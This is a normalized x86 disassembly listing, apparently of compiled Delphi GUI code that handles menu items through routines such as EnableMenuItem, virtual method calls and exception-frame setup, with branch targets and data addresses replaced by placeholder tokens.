call sub_44911c
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_4476b0
push eax
call EnableMenuItem
sub_4490c0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_449480
mov edx eax
mov ecx ebx
mov eax edi
call sub_447650
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_448fac
sub_44912c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_414170
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_446758
sub_44919c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_44911c
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_449184
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_4494b4
mov ecx ebx
mov edx esi
mov eax edi
call sub_4492a8
sub_4491e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44911c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44912c
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44923c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_44911c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44912c
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44912c
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_4492a8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_446758
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_447650
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_4141ec
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_449520
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_44911c
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_447580
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_414170
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_414170
mov dl [ eax + 0x3f ]
mov eax esi
call sub_4490c0
sub_44935c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_446758
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_44911c
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_447580
mov eax ebx
call sub_44911c
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_414170
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_414060
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_4493d0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_448ff4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_449104
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_449104
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_449498
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44911c
mov edx eax
mov ecx esi
mov eax ebx
call sub_4492a8
pop esi
pop ebx
retn
sub_4494b4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_449480
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_44935c
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_446758
sub_4494dc
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_449520
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_449520
jmp r-xdata
mov eax ebx
call sub_447580
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_44b1f8
sub_449578
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov [ ebx + 0x4c ] eax
sub_4495a0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403294
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_449834
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403490
mov edx ebx
mov eax edi
call sub_41aa14
mov eax ebx
mov si 0xffee
call sub_403490
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_449610
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov [ esi + 0x4c ] eax
sub_449644
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_44911c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_44912c
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_449684
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4494b4
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_449498
jmp r-xdata
mov edx ebx
mov eax esi
call sub_449498
sub_4496e8
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_448fac
sub_449714
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_448f84
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_448ff4
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_449048
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_4040a4
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_449174
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_4490c0
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_449150
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_449164
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_449834
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_449104
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403490
sub_449858
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_449878
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_449898
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4498b8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4498d8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4498f8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_449918
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_449938
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_449958
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_449978
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414850
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_443c80
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_443db8
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_443e18
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_443b18
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_443ed8
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4499f0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41ac60
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_449104
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_4495a0
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_449a44
jmp r-xdata
xor edx edx
mov eax esi
call sub_447508
sub_449a44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_444edc
mov eax ebx
call sub_449ab4
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_444f20
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_41aa14
sub_449a8c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_449a8c
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_446bdc
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_449520
mov eax ebx
pop esi
pop ebx
retn
sub_449ac8
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c2ac
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4045b0
sub_449af8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4040e8
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_449b7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_449c9e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404310
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404310
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404570
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40445c
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449ca5
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404074
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4045f8
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4043d0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404310
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404570
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4043d0
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_449cdc
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44a17b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4040e8
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44a13c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_44911c
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_4040e8
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a182
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_404074
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_404074
lea eax [ ebp - 0x18 ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax ebx
call sub_44a330
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44912c
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40445c
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_449af8
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44912c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44912c
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403294
mov eax [ ebp - 0x20 ]
call sub_403294
mov eax [ ebp - 0x14 ]
call sub_403294
mov eax [ ebp - 0xc ]
call sub_403294
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_449af8
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404310
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_44912c
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_44bbd4
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407bf8
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_4040a4
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c2ac
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c2ac
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44912c
push eax
mov edx esi
mov eax ebx
call sub_44912c
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404570
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407bf8
push ebp
mov eax [ ebp - 0x2c ]
call sub_449ac8
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_449ac8
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c2ac
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_4040e8
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44912c
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_44912c
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_44bb40
mov edx [ ebp - 0x40 ]
pop eax
call sub_4040a4
mov edx esi
mov eax ebx
call sub_44912c
push eax
mov edx esi
mov eax ebx
call sub_44912c
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404310
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404570
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_449b7c
mov eax [ ebp - 0x18 ]
call sub_404310
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4045b0
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4045f8
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_449b7c
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_44a1d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
